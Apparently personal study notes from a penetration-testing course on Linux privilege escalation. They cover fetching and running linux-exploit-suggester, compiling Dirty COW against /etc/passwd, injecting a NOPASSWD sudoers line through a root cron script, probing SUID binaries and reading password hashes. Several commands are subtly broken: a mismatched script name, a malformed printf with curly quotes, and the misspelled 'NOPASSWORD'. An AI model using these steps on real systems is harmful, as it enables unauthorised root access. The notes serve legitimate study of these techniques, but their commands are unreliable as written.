--- 
Kernel exploits on Linux will typically target vulnerabilities In the Linux
kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.

- This process will differ based on the Kernel version and distribution being
targeted and the kernel exploit being used.

- Privilege escalation on Linux systems will typically follow the following
methodology:
	+ Identifying kernel vulnerabilities
	+ Downloading, compiling and transferring kernel exploits onto the target system.



### [Linux-Exploit-Suggester](https://github.com/mzet-/linux-exploit-suggester)
This tool is designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine. It assesses (using heuristics methods) the exposure of the given kernel on every publicly known Linux kernel exploit.

### Steps to Exploit: 

1.  Detecting security deficiencies for given Linux kernel/Linux-based machine.

``` bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
#Download the script

 ./linux-exploit-suggester.sh
# Run the script
...
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,[ ubuntu=14.04 ]{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
```

 2. Try to exploit the vulnerabilityyou have 
 3. 
 ``` bash
meterpreter > shell 
> /bin/bash -i bash
```

### Dirty COW (CVE-2016-5195)
A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. All the information we have so far is included in this page.

-   An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.
-   This flaw allows an attacker with a local system account to modify on-disk binaries, bypassing the standard permission mechanisms that would prevent modification without an appropriate permission set.
- 
The exploitdb proof of concepts available [here](https://www.exploit-db.com/exploits/40839)

``` bash
# Compile with:
gcc -pthread dirty.c -o dirty -lcrypt

# Then run the newly create binary by either doing:
"./dirty" or "./dirty my-new-password">

#DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
mv /tmp/passwd.bak /etc/passwd

```

## Cron Jobs

- Linux implements task scheduling through a utility called Cron.

- Cron is a time-based service that runs applications, scripts and other commands
repeatedly on a specified schedule.

- An application, or script that has been configured to be run repeatedly with Cron
is known as a Cron job. Cron can be used to automate or repeat a wide variety of
functions on a system, from daily backups to system upgrades and patches.

- The crontab file is a configuration file that is used by the Cron utility to store and
track Cron jobs that have been created.

## Exploiting Misconfigured Cron Jobs

- Cron jobs can also be run as any user on the system, this is a very important
factor to keep an eye on as we will be targeting Cron jobs that have been
configured to be run as the “root” user.

-  This is primarily because, any script or command that is run by a Cron job will
run as the root user and will consequently provide us with root access.

- In order to elevate our privileges, we will need to find and identify cron jobs
scheduled by the root user or the files being processed by the cron job.

```
crontab -l
grep -rnw /usr -e "/home/student/message"
 printf “#!/bin/bash\necho "student ALL=NOPASSWORD:ALL" >> '/etc/sudoers' > /usr/local/share/copy.sh
```




![[Pasted image 20230419104635.png]]


## Exploiting SUID Binaries

-  In addition to the three main file access permissions (read, write and execute), Linux also provides users with specialized permissions that can be utilized in specific situations. One of these access permissions is the SUID (Set Owner User ID) permission.

-  When applied, this permission provides users with the ability to execute a script or binary with the permissions of the file owner as opposed to the user that is running the script or binary.

-  SUID permissions are typically used to provide unprivileged users with the ability to run specific scripts or binaries with “root” permissions. It is to be noted, however, that the provision of elevate privileges is limited to the execution of the script and does not translate to elevation of privileges, however, if improperly configured unprivileged users can exploit misconfigurations or vulnerabilities within the binary or script to obtain an elevated session.

This is the functionality that we will be attempting to exploit in order to elevate our
privileges, however, the success of our attack will depend on the following factors:

>	○ Owner of the SUID binary – Given that we are attempting to elevate our privileges, we will only be exploiting SUID binaries that are owned by the “root” user or other privileged users.
>	
>	○ Access permissions – We will require executable permissions in order to execute the SUID binary.

```bash
 file welcome
 strings welcome
 ```
## Linux Password Hashes
-  Linux has multi-user support and as a result, multiple users can access the system
simultaneously. This can be seen as both an advantage and disadvantage from a security perspective, in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server.

- All of the information for all accounts on Linux is stored in the passwd file located in: /etc/passwd

-  We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system.

-  All the encrypted passwords for the users are stored in the shadow file. it can be found in the following directory: /etc/shadow

-  The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords.

- The passwd file gives us information in regards to the hashing algorithm that is being used and the password hash, this is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength. We can determine this by looking at the number after the username encapsulated by the dollar symbol ($).

![[Pasted image 20230419112640.png]]
